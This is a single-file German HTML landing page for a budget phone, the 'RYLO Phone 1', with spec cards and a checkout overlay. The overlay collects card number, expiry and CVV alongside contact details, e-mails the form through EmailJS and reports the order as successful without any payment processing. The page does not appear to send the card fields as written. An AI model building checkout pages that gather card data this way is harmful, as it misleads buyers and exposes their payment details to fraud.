<!DOCTYPE html>
<html lang="de">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RYLO Phone 1 – Der neue Standard</title>
    <link href="https://unpkg.com/aos@2.3.1/dist/aos.css" rel="stylesheet">
    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
    <style>
        :root {
            --bg-color: #000000;
            --bg-image: radial-gradient(circle at center, #001f3f 0%, #000 100%);
            --card-bg: rgba(17, 17, 17, 0.8);
            --text-color: #ffffff;
            --btn-bg: #ffffff;
            --btn-text: #000000;
            --label: #444;
            --sub: #666;
            --border: #1a1a1a;
            --accent: #3b82f6;
            --input-bg: rgba(255,255,255,0.05);
        }

        .light-mode {
            --bg-color: #ffffff;
            --bg-image: none;
            --card-bg: #f2f2f7; 
            --text-color: #000000;
            --btn-bg: #000000;
            --btn-text: #ffffff;
            --label: #8e8e93;
            --sub: #48484a;
            --border: #d1d1d6;
            --input-bg: #ffffff;
        }

        body { 
            background-color: var(--bg-color);
            background-image: var(--bg-image);
            background-attachment: fixed;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, sans-serif; 
            margin: 0; padding-bottom: 60px; color: var(--text-color); 
            transition: all 0.5s ease;
            min-height: 100vh;
            overflow-x: hidden;
        }

        #loader {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: #000; display: flex; flex-direction: column;
            justify-content: center; align-items: center; z-index: 9999;
            transition: opacity 0.8s ease;
        }
        .loader-hidden { opacity: 0; pointer-events: none; }

        #checkout {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0,0,0,0.85); backdrop-filter: blur(15px);
            display: none; justify-content: center; align-items: center; z-index: 10000;
            overflow-y: auto; padding: 20px 0;
            opacity: 0; transition: opacity 0.4s ease;
        }

        .checkout-card {
            background: var(--bg-color); border: 1px solid var(--border);
            width: 90%; max-width: 500px; border-radius: 30px; padding: 40px;
            position: relative;
            transform: scale(0.9) translateY(20px);
            transition: transform 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
        }

        #checkout.active { display: flex; opacity: 1; }
        #checkout.active .checkout-card { transform: scale(1) translateY(0); }

        .close-btn { position: absolute; top: 20px; right: 20px; cursor: pointer; font-size: 24px; opacity: 0.5; }

        .input-group { margin-bottom: 15px; }
        .input-group label { display: block; font-size: 10px; text-transform: uppercase; letter-spacing: 1px; margin-bottom: 5px; color: var(--label); }
        .input-group input {
            width: 100%; padding: 12px 15px; border-radius: 12px; border: 1px solid var(--border);
            background: var(--input-bg); color: var(--text-color); font-size: 14px; box-sizing: border-box; outline: none;
        }

        .form-row { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; }

        nav { width: 100%; max-width: 1200px; margin: 0 auto; padding: 20px; display: flex; justify-content: space-between; align-items: center; box-sizing: border-box; }
        .theme-toggle { background: var(--card-bg); border: 1px solid var(--border); color: var(--text-color); width: 45px; height: 45px; border-radius: 50%; cursor: pointer; display: flex; align-items: center; justify-content: center; }
        
        .hero { text-align: center; padding: 40px 20px 60px; }
        h1 { font-size: clamp(40px, 10vw, 120px); font-weight: 900; margin: 0; letter-spacing: -3px; line-height: 0.9; }
        
        .bento-grid { 
            display: grid; grid-template-columns: repeat(1, 1fr); gap: 15px; 
            width: 100%; max-width: 1200px; margin: 0 auto; padding: 20px; box-sizing: border-box; 
        }
        
        .card { 
            background: var(--card-bg); padding: 30px; border-radius: 30px; 
            border: 1px solid var(--border); display: flex; flex-direction: column; 
            justify-content: center; backdrop-filter: blur(10px); min-height: 140px;
        }
        
        @media (min-width: 768px) {
            .bento-grid { grid-template-columns: repeat(4, 1fr); }
            .span-2 { grid-column: span 2; }
            .span-4 { grid-column: span 4; }
        }

        .label { color: var(--label); text-transform: uppercase; font-size: 10px; font-weight: 800; letter-spacing: 2px; margin-bottom: 10px; }
        .value { font-size: 32px; font-weight: 800; margin: 0; }
        .price-big { font-size: clamp(60px, 10vw, 80px); font-weight: 900; font-style: italic; line-height: 1; }
        
        .btn { background: var(--btn-bg); color: var(--btn-text) !important; padding: 18px 40px; border-radius: 100px; font-weight: 900; text-decoration: none; display: inline-block; border: none; cursor: pointer; transition: 0.3s; text-align: center; }

        footer { margin-top: 60px; color: var(--label); font-size: 8px; letter-spacing: 6px; text-transform: uppercase; text-align: center; }
        @keyframes load { to { left: 0; } }
    </style>
</head>
<body>

    <div id="loader">
        <div style="color:white; font-weight:900; font-size:40px; margin-bottom:20px;">RYLO</div>
        <div style="width:100px; height:2px; background:rgba(255,255,255,0.2); position:relative; overflow:hidden;">
            <div style="position:absolute; width:100%; height:100%; background:var(--accent); left:-100%; animation: load 2s forwards;"></div>
        </div>
    </div>

    <div id="checkout">
        <div class="checkout-card">
            <div class="close-btn" onclick="toggleCheckout()">✕</div>
            <h2 style="margin: 0 0 5px 0;">Bestellung</h2>
            <div style="color: var(--accent); font-weight: 700; margin-bottom: 25px;">RYLO Phone 1 — 299€</div>
            
            <form id="orderForm">
                <div class="input-group"><label>Name</label><input type="text" name="user_name" placeholder="Vollständiger Name" required></div>
                <div class="input-group"><label>E-Mail</label><input type="email" name="user_email" placeholder="Deine E-Mail" required></div>
                <div class="input-group"><label>Adresse</label><input type="text" name="user_address" placeholder="Straße, Nr, Stadt" required></div>
                
                <div style="border-top: 1px solid var(--border); margin: 20px 0; padding-top: 20px;">
                    <div class="input-group"><label>Kartennummer</label><input type="text" placeholder="XXXX XXXX XXXX XXXX" required></div>
                    <div class="form-row">
                        <div class="input-group"><label>Ablauf</label><input type="text" placeholder="MM/YY" required></div>
                        <div class="input-group"><label>CVV</label><input type="text" placeholder="123" required></div>
                    </div>
                </div>
                <button type="submit" id="submitBtn" class="btn" style="width: 100%;">JETZT KAUFEN</button>
            </form>
        </div>
    </div>

    <nav>
        <div style="font-weight: 900; font-size: 22px;">RYLO Phone 1</div>
        <div style="display: flex; gap: 15px; align-items: center;">
            <button class="theme-toggle" id="themeBtn" onclick="toggleTheme()">🌙</button>
            <a onclick="toggleCheckout()" class="btn" style="padding: 8px 18px; font-size: 10px;">SHOP</a>
        </div>
    </nav>

    <section class="hero" data-aos="fade-down">
        <h1>RYLO Phone 1.</h1>
        <p style="color: var(--sub);">Günstig war noch nie so leistungsstark.</p>
    </section>

    <div class="bento-grid">
        <div class="card span-2" style="background: #fff; color: #000; border: none;" data-aos="fade-up">
            <span class="label" style="color: #888;">Aktionspreis</span>
            <div class="price-big">299€</div>
        </div>
        <div class="card" data-aos="fade-up"><span class="label">Display</span><div class="value">120Hz</div></div>
        <div class="card" data-aos="fade-up"><span class="label">Leistung</span><div class="value">SD 6 Gen 3</div></div>
    </div>

    <footer>RYLO Global 2026</footer>

    <script src="https://unpkg.com/aos@2.3.1/dist/aos.js"></script>
    <script>
        (function() {
            emailjs.init("0dAS4ug_oZTw4dOcL"); 
        })();

        window.addEventListener('load', () => {
            setTimeout(() => {
                document.getElementById('loader').classList.add('loader-hidden');
                AOS.init({ duration: 800, once: true });
            }, 2000);
        });

        function toggleTheme() {
            document.body.classList.toggle('light-mode');
            document.getElementById('themeBtn').innerHTML = document.body.classList.contains('light-mode') ? '☀️' : '🌙';
        }

        function toggleCheckout() {
            const checkout = document.getElementById('checkout');
            if (checkout.classList.contains('active')) {
                checkout.classList.remove('active');
                setTimeout(() => { checkout.style.display = 'none'; }, 400);
                document.body.style.overflow = 'auto';
            } else {
                checkout.style.display = 'flex';
                setTimeout(() => { checkout.classList.add('active'); }, 10);
                document.body.style.overflow = 'hidden';
            }
        }

        document.getElementById('orderForm').addEventListener('submit', function(e) {
            e.preventDefault();
            const btn = document.getElementById('submitBtn');
            btn.innerHTML = "SENDET...";
            btn.disabled = true;

            emailjs.sendForm('service_v3i568z', 'Template_3ji1aps', this)
                .then(function() {
                    alert('Bestellung erfolgreich versendet!');
                    toggleCheckout();
                    btn.innerHTML = "JETZT KAUFEN";
                    btn.disabled = false;
                }, function(error) {
                    alert('Fehler: ' + JSON.stringify(error));
                    btn.innerHTML = "FEHLER";
                    btn.disabled = false;
                });
        });
    </script>
</body>
</html>
